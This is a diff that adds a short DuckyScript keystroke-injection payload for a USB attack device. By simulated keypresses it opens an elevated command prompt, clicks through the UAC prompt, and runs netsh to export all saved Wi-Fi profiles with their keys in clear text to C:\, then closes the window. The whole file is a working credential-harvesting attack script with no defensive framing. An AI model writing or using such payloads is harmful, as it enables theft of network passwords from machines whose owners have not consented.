@@ -1,0 +1,23 @@
+REM     -----------------------------------------------------------------------------
+REM     Author: KaazDW
+REM     -----------------------------------------------------------------------------
+
+GUI r
+DELAY 500
+STRING cmd
+CTRL SHIFT ENTER
+DELAY 500
+LEFT
+ENTER
+DELAY 500
+ALT y
+DELAY 500
+
+STRING netsh wlan show profiles
+ENTER
+DELAY 2000
+
+STRING netsh wlan export profile folder=C:\ key=clear
+ENTER
+DELAY 3000
+ALT F4
